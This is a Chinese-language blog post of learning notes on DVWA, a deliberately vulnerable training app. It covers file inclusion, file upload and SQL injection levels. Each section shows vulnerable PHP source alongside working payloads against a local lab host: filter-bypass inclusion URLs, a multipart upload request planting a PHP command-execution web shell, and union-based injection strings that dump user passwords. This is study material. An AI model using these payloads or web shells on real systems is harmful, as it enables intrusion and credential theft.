---
layout: post
title: "DVWA-Learning-Notes-2"
subtitle: "DVWA-Learning-Notes-2"
date: 2019-02-24
author: ppbibo
category: security
finished: true
---
[TOC]

<center><b>DVWA-File Inclusion</b></center>



##### 常见的文件包含函数

1. include()

2. include_once()

3. require()

4. require_once()

5. file_open()…

##### medium

[ * ] vulnerabilities/fi/source/medium.php

```php
<?php 

// The page we wish to display 
$file = $_GET[ 'page' ]; 

// Input validation 
$file = str_replace( array( "http://", "https://" ), "", $file ); 
$file = str_replace( array( "../", "..\"" ), "", $file ); 

?> 
  
  
```

```bash
[*]
# str_replace   字符串替换函数

# 代码中将 http://  https://  ../  .. 过滤为空

# Payload:

# 1. 大小写绕过
# 2. 代码混淆绕过
GET:
http://10.211.55.7/web/dvwa-master/vulnerabilities/fi/?page=HttP://10.211.55.7/phpinfo.php

http://10.211.55.7/web/dvwa-master/vulnerabilities/fi/?page=hthttp://tp://10.211.55.7/phpinfo.php
```



##### high

[ * ] vulnerabilities/fi/source/high.php

```php
<?php 

// The page we wish to display 
$file = $_GET[ 'page' ]; 

// Input validation 
if( !fnmatch( "file*", $file ) && $file != "include.php" ) { 
    // This isn't the page we want! 
    echo "ERROR: File not found!"; 
    exit; 
} 

?> 
  
# fnmatch() 函数根据指定的模式来匹配文件名或字符串。
# 代码中使用 fnmatch() 函数判断文件名必须以file 开头 
# 或者 file为include.php 否则输出 ERROR：File not found!
 
# Payload
# file://  协议利用
GET:
http://10.211.55.7/web/dvwa-master/vulnerabilities/fi/?page=file://C:\phpstudy\phptutorial\www\phpinfo.php


利用成功
```

[fnmatch() 函数根据指定的模式来匹配文件名或字符串](https://www.php.net/manual/zh/function.fnmatch.php)



##### impossible

```php
<?php 

// The page we wish to display 
$file = $_GET[ 'page' ]; 

// Only allow include.php or file{1..3}.php 
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) { 
    // This isn't the page we want! 
    echo "ERROR: File not found!"; 
    exit; 
} 

?> 
  
// 代码中直接验证了file变量是不是固定的文件名

```





<center>DVWA-File Upload</center>



##### medium

[ * ] vulnerabilities/upload/source/medium.php

```php

<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];   // 文件名称
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];   // 文件类型
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];   // 文件大小

    // Is it an image? 
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
        ( $uploaded_size < 100000 ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?> 


# DVWA_WEB_PAGE_TO_ROOT为网页的根目录
# basename() 函数返回路径中的文件名部分
# move_uploaded_file() 函数把上传的文件移动到新位置 
  // move_uploaded_file(file,newloc)  
  // 如果成功该函数返回 TRUE，如果失败则返回 FALSE

# 上面的代码声明了三个变量分别来获取文件的名字，文件的类型，文件的大小
# 判断文件的类型否是为 "image/jpeg" 或者为 "image/png"   并且文件的大小是否小于100kb

  
请求：
  
Payload:

POST /web/dvwa-master/vulnerabilities/upload/ HTTP/1.1
Host: 10.211.55.7
Content-Length: 419
Cache-Control: max-age=0
Origin: http://10.211.55.7
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryenC9n7ioYVI54ylH
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/\*;q=0.8
Referer: http:/\/10.211.55.7/web/dvwa-master/vulnerabilities/upload/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: security=medium; PHPSESSID=ptoav2992gf1tknc4ripjj3c35
Connection: close

------WebKitFormBoundaryenC9n7ioYVI54ylH
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryenC9n7ioYVI54ylH
Content-Disposition: form-data; name="uploaded"; filename="3.php"
Content-Type: image/jpeg

<?php shell_exec($_GET['cmd']); ?>

------WebKitFormBoundaryenC9n7ioYVI54ylH
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryenC9n7ioYVI54ylH--

 
 // Content-Type: text/php  替换为 image/jpeg 或者 image/png 都可以
 
 
 返回：
  
 ../../hackable/uploads/3.php succesfully uploaded!  // 上传成功
  

  
http://10.211.55.7/web/dvwa-master/hackable/uploads/3.php?cmd=whoami

administrator
  
# 利用成功
```



##### high

[ * ] vulnerabilities/upload/source/high.php

```php
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];   // 文件的名字
    
  	// 获取文件后缀名称
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);  
		
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 
  	// 保存的是文件上传到服务器临时文件夹之后的文件名

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && 
        ( $uploaded_size < 100000 ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?> 
  
# substr() 函数返回字符串的一部分。
# 注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0
# 例子：	
	<?php
	echo substr("Hello world",6); // 从字符串中返回 "world"：
	?>
	

  
# strrpos() 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）
# 例子:
  <?php
  echo strrpos("123456.php",".");  // 返回 6
	?>

# 代码中 substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1) 来获取后缀名
    
# getimagesize(string) ：函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING级的错误。所以 getimagesize函数的作用是判断上传的文件是不是有效的图片

# move_uploaded_file（file,newlocal） 函数表示把给定的文件移动到新的位置
    
    
# 代码中判断了文件的文件的后缀名字是否为 jpg,png,jpeg 并且文件的大小要小于100kb 并且检测必须为一个有效的图片才能上传成功
    
[ * ] %00截断需要PHP<5.3.4
[ * ] 这里上传的方式为Nginx畸形解析
[ * ] Studay 环境为 PHP5.3.29 + Nginx
[ * ] Payload：
    
    上传一个正常的图片网马，上传成功后访问 WebShell
    http://10.211.55.7/web/dvwa-master//hackable/uploads/1.jpg/1.php

还可以和文件包含漏洞组合利用等其他方法 
```

[upload-labs 总结](https://6o9.im/2018/12/30/upload-labs/)



##### impossible

[ * ] vulnerabilities/upload/source/impossible.php

```php
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 


    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Where are we going to be writing to? 
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; 
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; 
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); 
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && 
        ( $uploaded_size < 100000 ) && 
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
        if( $uploaded_type == 'image/jpeg' ) { 
            $img = imagecreatefromjpeg( $uploaded_tmp ); 
            imagejpeg( $img, $temp_file, 100); 
        } 
        else { 
            $img = imagecreatefrompng( $uploaded_tmp ); 
            imagepng( $img, $temp_file, 9); 
        } 
        imagedestroy( $img ); 

        // Can we move the file to the web root from the temp folder? 
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
            // Yes! 
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>"; 
        } 
        else { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 

        // Delete any temp files 
        if( file_exists( $temp_file ) ) 
            unlink( $temp_file ); 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?> 
  

```



<center><b>DVWA-SQL Injection</b></center>

##### LOW

[ * ] vulnerabilities/sqli/source/low.php

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 
  
PS：参数 $id 没有任何的交验处理  
[ 测试步骤 ]
1'      // 直接SQl语法错误
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
 


  
1' or 2=2-- s
1' order by 2-- s      // 猜测字段
1' union select database(),@@version -- s     // 获取当前数据库名称和mysql版本
1' union select user,password from users -- s    // 获取users字段中的用户密码数据
1' union select 1,@@global.version_compile_os from mysql.user -- s     // 获取操作系统信息
1' and ord(mid(user(),1,1))=114 -- s   // 返回正常则当前连接的用户为root

// infromation_scehma，该数据库存储了Mysql所有数据库和表的信息 ( 爆出所有数据库的名称 ) 
1' union select 1,schema_name from information_schema.schemata -- s   

1' and exists(select * from users) --  s      // 猜解表名
1' and exists(select user,password from users) --  s      // 猜解字段


```



##### medium

[ * ] vulnerabilities/sqli/source/medium.php

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?> 
  
  
[ * ] 
/*  
mysql_real_escape_string 函数是实现转义 SQL 语句字符串中的特殊字符，如输入单引号'则处理时会在其前面加上右斜杠\来进行转义，如果语句错误则输出相应的错误信息。

其中受影响的字符如下：
\x00  \n  \r  \ '  "  \x1a

*/

[测试步骤]

URL: http://127.0.0.1:888/vulnerabilities/sqli/
POST:

id=2 and 1=1 -- s &Submit=Submit
id=2 and 1=2 -- s &Submit=Submit
id=1 union select 1,table_name from information_schema.tables where table_schema=(select database())-- s&Submit=Submit      // 获取当前数据库的表



```



##### high

[ * ] vulnerabilities/sqli/source/high.php

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?> 
  
  
和Low等级一样
测试步骤使用LOW等级的测试方法即可
```



DVWA深入学习#2（持续更新）….



 